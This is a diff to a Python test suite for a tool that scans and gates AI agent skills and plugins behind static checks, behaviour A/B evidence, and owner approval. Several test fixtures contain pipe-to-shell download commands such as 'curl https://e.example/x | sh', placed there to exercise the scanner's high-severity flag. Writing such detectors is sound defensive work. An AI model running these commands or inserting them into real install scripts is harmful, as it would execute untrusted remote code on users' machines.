@@ -26,6 +26,13 @@ def component(record, cid):
     return next(c for c in record["components"] if c["id"] == cid)
 
 
+def ab(*components, **extra):
+    """A consented live behavior A/B with a gain and a parity floor that names the components it covers (D17)."""
+    return {"schema_version": 1, "evidence_id": "fixture/T3a/ab", "provenance": "runner-live", "mode": "live", "level": "measured",
+            "bundle_sha256": "1" * 64, "consent_id": "c-ab", "result": "gain", "integration": "clear", "parity": "parity",
+            "components": list(components), **extra}
+
+
 class SourceTests(unittest.TestCase):
     def test_github_forms_share_one_identity(self):
         forms = ["https://github.com/Example/Sweet-Notes", "https://github.com/example/sweet-notes.git",
@@ -80,7 +87,8 @@ class SourceTests(unittest.TestCase):
 
 
 class StaticScanTests(unittest.TestCase):
-    def test_clean_text_skill_is_proposed_for_absorption_but_untested(self):
+    def test_clean_text_skill_is_held_behind_an_ab_until_one_covers_it(self):
+        """D17: model-facing text is held behind a behavior A/B; static checks alone never make it absorbable."""
         record = scan({"skills/sweet-notes/SKILL.md": skill("sweet-notes"), "LICENSE": MIT, "README.md": b"# Sweet\n"})
         self.assertEqual(record["license"]["spdx"], "MIT")
         self.assertEqual(record["exec_class"], "X0")
@@ -89,9 +97,18 @@ class StaticScanTests(unittest.TestCase):
         self.assertEqual(derived["headline"], "untested")
         self.assertIn("free-checks-passed", derived["chips"])
         part = next(c for c in derived["components"] if c["id"] == "skill:sweet-notes")
-        self.assertEqual((part["disposition"], part["installable"]), ("absorb", True))
-        self.assertIn("quality not measured", part["reason"])
+        self.assertEqual((part["disposition"], part["installable"], part["reason_code"], part["missing_code"]),
+                         ("hold", False, "x0-text-ab", "ab"))
+        self.assertIn("D17", part["reason"])
+        self.assertIn("行為 A/B", part["missing_zh"])
         self.assertEqual(next(c for c in derived["components"] if c["id"] == "docs")["disposition"], "hold")
+        # Only a consented A/B with a gain and a parity floor that names this part makes it absorbable.
+        for other in (ab("skill:other"), ab("skill:sweet-notes", parity=None), ab("skill:sweet-notes", result="no-gain")):
+            held = next(c for c in core.derive([record, other])["components"] if c["id"] == "skill:sweet-notes")
+            self.assertEqual(held["disposition"], "hold", other)
+        covered = core.derive([record, ab("skill:sweet-notes")])
+        part = next(c for c in covered["components"] if c["id"] == "skill:sweet-notes")
+        self.assertEqual((covered["headline"], part["disposition"], part["installable"], part["level"]), ("nutritious", "absorb", True, "measured"))
 
     def test_executable_surfaces_split_into_components_and_never_absorb(self):
         hooks = (b'{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "bash ${CLAUDE_PLUGIN_ROOT}/hooks/start.sh"}]}],'
@@ -129,7 +146,9 @@ class StaticScanTests(unittest.TestCase):
                 self.assertNotEqual(part["disposition"], "absorb", part["id"])
         by_id = {c["id"]: c for c in derived["components"]}
         self.assertEqual(by_id["deps"]["disposition"], "excrete")
-        self.assertTrue(by_id["deps"]["owner_confirms"])
+        # A rule excrete applies an OAW policy and is final: nothing waits for an owner step that does not exist.
+        self.assertFalse(any(part["owner_confirms"] for part in derived["components"]))
+        self.assertIn("final", by_id["deps"]["reason"])
         self.assertEqual(by_id["instructions:CLAUDE.md"]["disposition"], "excrete")
         self.assertEqual(by_id["mcp:memory"]["disposition"], "hold")
 
@@ -159,7 +178,7 @@ class StaticScanTests(unittest.TestCase):
         ids = sorted(c["id"] for c in record["components"] if c["kind"] == "skill")
         self.assertEqual(ids, ["skill:review", "skill:review@plugins-egm"])
         derived = {c["id"]: c for c in core.derive([record])["components"]}
-        self.assertEqual(derived["skill:review"]["disposition"], "absorb")  # codex copy, metadata yaml allowed
+        self.assertEqual(derived["skill:review"]["reason_code"], "x0-text-ab")  # codex copy, metadata yaml allowed: static checks pass
 
     def test_docs_mentions_are_not_flags(self):
         record = scan({"README.md": b"Install: curl https://x.example/i.sh | sh\nEdit ~/.claude/settings.json\n",
@@ -259,7 +278,9 @@ class DeriveTests(unittest.TestCase):
         self.assertEqual(by_id["hooks:hooks/hooks.json"]["disposition"], "hold")
         self.assertIsNone(by_id["hooks:hooks/hooks.json"]["decision"])
         self.assertEqual(by_id["skill:sweet-notes"]["disposition"], "excrete")
-        absorbed = core.derive([self.record], [{"kind": "absorb", "components": ["skill:sweet-notes"]}])
+        unproven = core.derive([self.record], [{"kind": "absorb", "components": ["skill:sweet-notes"]}])
+        self.assertIsNone(next(c for c in unproven["components"] if c["id"] == "skill:sweet-notes")["decision"])
+        absorbed = core.derive([self.record, ab("skill:sweet-notes")], [{"kind": "absorb", "components": ["skill:sweet-notes"]}])
         self.assertEqual(next(c for c in absorbed["components"] if c["id"] == "skill:sweet-notes")["decision"], "absorbed")
 
     def test_older_scanner_records_are_kept_with_a_stale_chip(self):
@@ -326,12 +347,33 @@ class BuildEffectPlanTests(unittest.TestCase):
             self.assertIn("estimate", step["tokens"]["label"])
         self.assertIn("TX", {s["id"] for s in waiting["steps"]})
         policy = core.validate_policy(500_000_000, 1_000_000_000, ["isolated-venv", "project-copy", "no-api-keys"])
-        self.assertEqual(core.decide_plan("fixture", derived, policy=policy)["status"], "within policy - paid runs not enabled in v0")
+        self.assertEqual(core.decide_plan("fixture", derived, policy=policy)["status"],
+                         "within policy for Stage 0/1 - Stage 2 and a second host ask the owner first; paid runs not enabled in v0")
         small = core.validate_policy(1_000, 2_000, ["no-api-keys"])
         self.assertTrue(core.decide_plan("fixture", derived, policy=small)["status"].startswith("exceeds standing policy"))
         risky = core.derive([scan({"a/SKILL.md": skill("a"), "x.sh": b"curl https://e.example | sh\n", "LICENSE": MIT})])
         self.assertTrue(core.decide_plan("fixture", risky)["status"].startswith("blocked"))
         self.assertFalse(waiting["paid_runs_enabled"])
+
+    def test_only_stage_0_and_1_count_against_the_cap_and_stage_2_always_asks(self):
+        """D13 (PRE-01): the per-food cap covers screening only; Stage 2 never runs "within policy"."""
+        derived = core.derive([scan({"skills/a/SKILL.md": skill("a"), "LICENSE": MIT, "tools/run.py": b"print(1)\n"})])
+        plan = core.decide_plan("fixture", derived)
+        stages = {s["id"]: s["d13_stage"] for s in plan["steps"]}
+        self.assertEqual((stages["T0"], stages["TX"], stages["T3a-smoke"], stages["T4"], stages["P"], stages["T3a"], stages["G"]),
+                         (0, 1, 1, 2, 2, 2, "overhead"))
+        self.assertTrue(all(s["asks_owner"] == (s["d13_stage"] == 2) for s in plan["steps"]))
+        self.assertEqual(next(s for s in plan["steps"] if s["id"] == "TX")["sandbox_level"], 2)  # executes the food
+        estimate = plan["estimate"]
+        self.assertEqual(estimate["screening_max"], sum(s["tokens"]["max"] for s in plan["steps"] if s["d13_stage"] == 1))
+        self.assertLess(estimate["screening_max"], estimate["max"])
+        # A cap that covers the screens but not Stage 2 is within policy; the full total is never the yardstick.
+        between = core.validate_policy(estimate["screening_max"], estimate["screening_max"], ["no-api-keys"])
+        self.assertTrue(core.decide_plan("fixture", derived, policy=between)["status"].startswith("within policy for Stage 0/1"))
+        below = core.validate_policy(estimate["screening_max"] - 1, estimate["screening_max"], ["no-api-keys"])
+        self.assertTrue(core.decide_plan("fixture", derived, policy=below)["status"].startswith("exceeds standing policy"))
+        self.assertIn("Codex", plan["second_host"])
+        self.assertEqual({s["cost_zh"] for s in plan["steps"]}, {"免費", "付費"})
 
     def test_policy_validation(self):
         for args in ((-1, 5, ["no-api-keys"]), (10, 5, ["no-api-keys"]), (1, 2, []), (1, 2, ["root-shell"]), (True, 2, ["no-api-keys"])):
@@ -399,7 +441,7 @@ class ReviewRegressionTests(unittest.TestCase):
             self.assertIn("X1-inline", part["reason"])
             self.assertEqual(part["missing_code"], "tx")
         quiet = self.part("Write one note per decision and cite the source file in `notes/decisions.md`.\n")
-        self.assertEqual((quiet["exec_class"], quiet["disposition"]), ("X0", "absorb"))
+        self.assertEqual((quiet["exec_class"], quiet["disposition"], quiet["reason_code"]), ("X0", "hold", "x0-text-ab"))
         self.assertNotIn("text-only", quiet["reason"])
         # A reference file the skill ships counts as its instructions.
         shipped = self.part("Follow reference.md.\n", extra={"skills/x/reference.md": b"Run `npm install -g tool` first.\n"})
@@ -420,7 +462,7 @@ class ReviewRegressionTests(unittest.TestCase):
 
     def test_skills_that_fail_the_portable_lint_are_held(self):
         part = self.part("Notes.\n", name="note-taker")
-        self.assertEqual(part["disposition"], "absorb")
+        self.assertEqual(part["reason_code"], "x0-text-ab")
         record = scan({"skills/note-taker/SKILL.md": b"---\nname: note-taker\ndescription: Keep notes.\nversion: 1.0.0\n---\n\n# Notes\n", "LICENSE": MIT})
         held = next(c for c in core.derive([record])["components"] if c["id"] == "skill:note-taker")
         self.assertEqual((held["disposition"], held["reason_code"]), ("hold", "skill-portable"))
@@ -591,7 +633,8 @@ class PipelineTests(unittest.TestCase):
                 self.assertTrue(all(step["automation"] == "planned" for step in stage["steps"]))
         self.assertEqual([i["id"] for i in core.PIPELINE_INLETS], ["scout", "named"])
         table = core.pipeline_table()
-        self.assertEqual(table["symbols"], {"done": "●", "current": "◉", "blocked": "⊗", "todo": "○", "planned": "┄", "skipped": "–"})
+        self.assertEqual(table["symbols"], {"done": "●", "partial": "◐", "current": "◉", "blocked": "⊗", "removed": "⊖", "todo": "○",
+                                            "planned": "┄", "skipped": "–"})
         self.assertEqual([s["id"] for s in table["stages"]], list(core.PIPELINE_ORDER))
         view = core.build_view({})
         self.assertEqual((view["foods"], view["pipeline"]["empty_zh"]), ([], core.PIPELINE_EMPTY_ZH))
@@ -610,13 +653,21 @@ class PipelineTests(unittest.TestCase):
         self.assertEqual(self.summary(pipeline), ("intake", "current", ["taste", "forget"]))
         self.assertIn("1 份歷史證據，不計入判定", pipeline["note_zh"])
 
-    def test_a_clean_skill_waits_for_approval_and_history_can_join_as_backlog(self):
+    def test_a_clean_skill_waits_at_sorting_for_its_ab_and_history_can_join_as_backlog(self):
         card, pipeline = self.place([scan(self.CLEAN)])
-        self.assertEqual(self.summary(pipeline), ("approve", "current", ["absorb", "forget"]))
-        self.assertEqual(list(pipeline["stages"].values()), ["done", "done", "done", "done", "planned", "planned", "done", "current", "todo"])
+        self.assertEqual(self.summary(pipeline), ("sort", "current", ["forget"]))
+        self.assertEqual(list(pipeline["stages"].values()), ["done", "done", "done", "partial", "planned", "planned", "current", "todo", "todo"])
+        self.assertEqual((pipeline["ab_holds"], card["components"][0]["can_absorb"]), (1, False))
+        self.assertIn("1 個 skill 文字缺行為 A/B，D17", pipeline["note_zh"])
+        self.assertIn("和單吃食物比：未測", pipeline["note_zh"])
         self.assertEqual(pipeline["details"], [{"stage": "plan", "id": "plan", "label_zh": "看計畫"}])
         self.assertEqual(pipeline["parity"]["label"], "parity vs food alone: not tested")
         self.assertEqual(card["components"][0]["level"], "static-measured")
+        # With an A/B covering the text, the part waits for the owner at 核准.
+        card, pipeline = self.place([scan(self.CLEAN), ab("skill:a")])
+        self.assertEqual(self.summary(pipeline), ("approve", "current", ["absorb", "forget"]))
+        self.assertEqual(list(pipeline["stages"].values()), ["done", "done", "done", "partial", "planned", "done", "partial", "current", "todo"])
+        self.assertTrue(card["components"][0]["can_absorb"])
         history_only = scan({"README.md": b"# notes\n", "skills/b/run.sh": b"#!/bin/sh\necho hi\n", "skills/b/SKILL.md": skill("b"), "LICENSE": MIT})
         _card, pipeline = self.place([history_only, self.imported()])
         self.assertEqual(pipeline["stage"], "approve")
@@ -652,30 +703,44 @@ class PipelineTests(unittest.TestCase):
         self.assertRegex(pipeline["note_zh"], r"^暫留 2 個成分：缺的測試還在規劃中")
 
     def test_built_restored_away_and_removed_parts_sit_on_the_build(self):
-        record = scan(self.CLEAN)
+        record = dict(scan(self.CLEAN), recorded_at="2026-11-03T01:00:00Z")
+        proof = ab("skill:a")
         installed = {"components": {"skill:a": {"outcome": "installed", "name": "a"}}}
-        absorbed = [{"food": "a", "kind": "absorb", "components": ["skill:a"], "outcome": "installed", "build": "2.0.0+build.2.abcdef0"}]
-        _card, pipeline = self.place([record], absorbed, installed)
+        absorbed = [{"food": "a", "kind": "absorb", "components": ["skill:a"], "outcome": "installed", "build": "2.0.0+build.2.abcdef0",
+                     "at": "2026-11-03T02:00:00Z"}]
+        _card, pipeline = self.place([record, proof], absorbed, installed)
         self.assertEqual(self.summary(pipeline), ("build", "current", ["remove-food"]))
         self.assertEqual(pipeline["actions"][0]["params"], {"name": "a", "food": True})
-        self.assertEqual(list(pipeline["stages"].values()), ["done", "done", "done", "done", "planned", "planned", "done", "done", "current"])
-        _card, pipeline = self.place([record], absorbed, {"components": {}})
+        self.assertEqual(list(pipeline["stages"].values()), ["done", "done", "done", "partial", "planned", "done", "partial", "done", "current"])
+        _card, pipeline = self.place([record, proof], absorbed, {"components": {}})
         self.assertEqual(self.summary(pipeline), ("build", "current", ["restore", "forget"]))
         self.assertEqual(pipeline["actions"][0]["params"], {"build": "2.0.0+build.2.abcdef0"})
-        removed = absorbed + [{"food": "a", "kind": "remove", "components": ["skill:a"], "reason": "r"}]
-        _card, pipeline = self.place([record], removed, {"components": {}})
-        self.assertEqual(self.summary(pipeline), ("build", "done", ["forget"]))
-        self.assertIn("再加回要重新測試", pipeline["note_zh"])
+        # D6: a removed part has its own state and offers a new taste; it is not "done" like an absorbed one.
+        removed = absorbed + [{"food": "a", "kind": "remove", "components": ["skill:a"], "reason": "r", "at": "2026-11-03T03:00:00Z"}]
+        card, pipeline = self.place([record, proof], removed, {"components": {}})
+        self.assertEqual(self.summary(pipeline), ("build", "removed", ["taste", "forget"]))
+        self.assertEqual((pipeline["state_zh"], pipeline["actions"][0]["label_zh"]), ("已移除", "再送去試吃（免費）"))
+        self.assertEqual((card["components"][0]["retested_after_remove"], card["components"][0]["can_absorb"]), (False, False))
+        # A taste recorded after the removal makes it absorbable again; the old taste never does.
+        fresh = dict(record, recorded_at="2026-11-03T04:00:00Z")
+        card, pipeline = self.place([fresh, proof], removed, {"components": {}})
+        self.assertEqual((card["components"][0]["retested_after_remove"], card["components"][0]["can_absorb"]), (True, True))
+        self.assertEqual(self.summary(pipeline), ("approve", "current", ["absorb", "forget"]))
+        # A restore that brings a removed part back flags it for a re-test.
+        card, pipeline = self.place([record, proof], removed, installed)
+        self.assertEqual(self.summary(pipeline), ("build", "current", ["remove-food", "taste"]))
+        self.assertIn("移除後又被還原回來的：要重新測試", pipeline["note_zh"])
+        self.assertEqual(pipeline["readded_untested"], 1)
         flag_record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
         flag = next(f["id"] for f in flag_record["flags"] if f["severity"] == "high")
         toxic = absorbed + [{"food": "a", "kind": "triage", "flag": flag, "outcome": "confirm-toxic", "reason": "r"}]
-        _card, pipeline = self.place([flag_record], toxic, installed)
+        _card, pipeline = self.place([flag_record, proof], toxic, installed)
         self.assertEqual(self.summary(pipeline), ("build", "blocked", ["remove-food"]))
         self.assertIn("建議移除", pipeline["note_zh"])
 
     def test_measured_evidence_marks_the_test_stage_and_parity_only_when_measured(self):
         record = scan(self.CLEAN)
-        win = dict(self.LIVE, result="gain", integration="clear", parity="parity")
+        win = dict(self.LIVE, result="gain", integration="clear", parity="parity", components=["skill:a"])
         card, pipeline = self.place([record, win])
         self.assertEqual((card["verdict"]["headline"], pipeline["stages"]["test"], pipeline["stage"]), ("nutritious", "done", "approve"))
         self.assertEqual(pipeline["stages"]["review"], "planned")
@@ -687,6 +752,91 @@ class PipelineTests(unittest.TestCase):
         hurt = dict(self.LIVE, result="gain", integration="diarrhea", confirmed=True, parity="parity")
         _card, pipeline = self.place([record, hurt])
         self.assertEqual(self.summary(pipeline)[:2], ("sort", "blocked"))
+
+    # ---- the official process: stage labels, decisions and partial marks (D19 review)
+
+    def test_stage_labels_match_their_steps(self):
+        """automated = every step runs by itself; owner = every step is the owner's; mixed = more than one kind."""
+        for stage in core.PIPELINE_STAGES:
+            kinds = {step["automation"] for step in stage["steps"]}
+            if stage["automation"] == "mixed":
+                self.assertGreater(len(kinds), 1, stage["id"])
+            else:
+                self.assertEqual(kinds, {stage["automation"]}, stage["id"])
+        self.assertEqual({s["id"]: s["automation"] for s in core.PIPELINE_STAGES if s["id"] in ("static", "plan", "build")},
+                         {"static": "mixed", "plan": "mixed", "build": "mixed"})
+        plan = next(s for s in core.PIPELINE_STAGES if s["id"] == "plan")
+        self.assertEqual(next(step["automation"] for step in plan["steps"] if "Elephant" in step["label_zh"]), "planned")
+        build = next(s for s in core.PIPELINE_STAGES if s["id"] == "build")
+        self.assertIn(("每版引用清單：用在哪裡／沒採用的原因", "planned"), [(st["label_zh"], st["automation"]) for st in build["steps"]])
+        scout = next(i for i in core.PIPELINE_INLETS if i["id"] == "scout")
+        self.assertEqual(scout["steps"][0]["automation"], "owner")  # no schedule: the owner starts each week's search
+        self.assertIn("沒有排程", scout["steps"][0]["label_zh"])
+
+    def test_decisions_sit_on_one_stage_and_d14_and_d18_are_on_the_table(self):
+        cited = {}
+        for stage in core.PIPELINE_STAGES:
+            for decision in stage["decisions"]:
+                cited.setdefault(decision, []).append(stage["id"])
+        self.assertEqual(cited["D4"], ["intake"])
+        self.assertNotIn("decisions", core.PIPELINE_INLETS[0])
+        self.assertNotIn("quarantine", cited.get("D13", []))
+        build = " ".join(step["label_zh"] for step in next(s for s in core.PIPELINE_STAGES if s["id"] == "build")["steps"])
+        self.assertIn("2.x", build)
+        self.assertIn("授權檔", build)
+        sort = next(s for s in core.PIPELINE_STAGES if s["id"] == "sort")
+        self.assertIn(("沒建的項目寫「未量測（規劃：<等級>）」，規劃的等級另放一欄", "planned"),
+                      [(step["label_zh"], step["automation"]) for step in sort["steps"]])
+
+    def test_integration_and_parity_run_in_tests_and_name_collisions_are_listed_once(self):
+        steps = {s["id"]: " ".join(step["label_zh"] for step in s["steps"]) for s in core.PIPELINE_STAGES}
+        self.assertIn("T4", steps["test"])
+        self.assertIn("齊平底線 P", steps["test"])
+        self.assertNotIn("名稱碰撞", steps["sort"])
+        self.assertEqual(sum(text.count("名稱碰撞") for text in steps.values()), 1)
+
+    def test_partial_marks_passed_stages_whose_planned_steps_never_ran(self):
+        self.assertEqual(core.PARTIAL_STAGES, {"plan", "sort", "build"})
+        history_only = scan({"README.md": b"# notes\n", "skills/b/run.sh": b"#!/bin/sh\necho hi\n", "skills/b/SKILL.md": skill("b"), "LICENSE": MIT})
+        _card, pipeline = self.place([history_only, self.imported()])
+        self.assertEqual((pipeline["stage"], pipeline["stages"]["plan"], pipeline["stages"]["sort"]), ("approve", "partial", "partial"))
+        self.assertEqual(core.pipeline_table()["states_zh"]["partial"], "部分完成")
+
+    def test_the_plan_button_appears_only_once_the_plan_stage_is_passed(self):
+        record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
+        _card, pipeline = self.place([record])
+        self.assertEqual((pipeline["stage"], pipeline["stages"]["plan"], pipeline["details"]), ("static", "todo", []))
+
+    def test_high_flags_hold_parts_until_triage(self):
+        record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
+        flagged = [c for c in core.derive([record])["components"] if c["reason_code"] == "high-flags"]
+        self.assertTrue(flagged)
+        self.assertTrue(all((c["disposition"], c["missing_code"], c["owner_confirms"]) == ("hold", "triage", False) for c in flagged))
+        flag = next(f["id"] for f in record["flags"] if f["severity"] == "high")
+        toxic = core.derive([record], [{"kind": "triage", "flag": flag, "outcome": "confirm-toxic", "reason": "r"}])
+        self.assertEqual(next(c for c in toxic["components"] if c["id"] == flagged[0]["id"])["disposition"], "excrete")
+
+    def test_engine_text_reaches_the_page_in_chinese(self):
+        record = scan({"skills/a/SKILL.md": skill("a"), "install.sh": b"#!/bin/sh\ncurl https://e.example/x | sh\n", "LICENSE": MIT})
+        card = core.food_card({"id": "a", "source": {}}, [record], [])
+        self.assertEqual(card["verdict"]["reasons_zh"], ["1 個高嚴重度旗標還沒分流"])
+        pipe = next(f for f in card["flag_list"] if f["rule"] == "F-PIPE")
+        self.assertEqual(pipe["meaning_zh"], "把下載的內容直接交給 shell 執行")
+        self.assertEqual(core.derive([scan(self.CLEAN)])["reasons_zh"], ["沒有實測證據（付費實測還沒跑）"])
+        rules = {rule for rule, *_rest in core.RULES}
+        self.assertFalse(rules - set(core.FLAG_MEANINGS_ZH))
+        plan = core.decide_plan("a", core.derive([record]))
+        self.assertEqual(next(s for s in plan["steps"] if s["id"] == "T2a")["cost_zh"], "免費（你的時間）")
+
+    def test_imported_goldfish_records_say_when_zero_context_was_not_recorded(self):
+        """D15: zero context is verified, not assumed; missing launch fields are kept as None, never filled in."""
+        record = core.imported_record("a", {"goldfish-1.json": {"reviewer": "g1", "findings": []},
+                                            "goldfish-2.json": {"reviewer": "g2", "findings": [], "launch": {
+                                                "method": "recipe", "host_version": "2.1", "inherited_context": "none",
+                                                "init_event_check": "no tools"}}}, [], "t")
+        first, second = record["goldfish"]
+        self.assertEqual(first["launch"], {"method": None, "host_version": None, "inherited_context": None, "init_event_check": None})
+        self.assertEqual((first["zero_context"], second["zero_context"]), ("not verified", "verified"))
 
 
 if __name__ == "__main__":
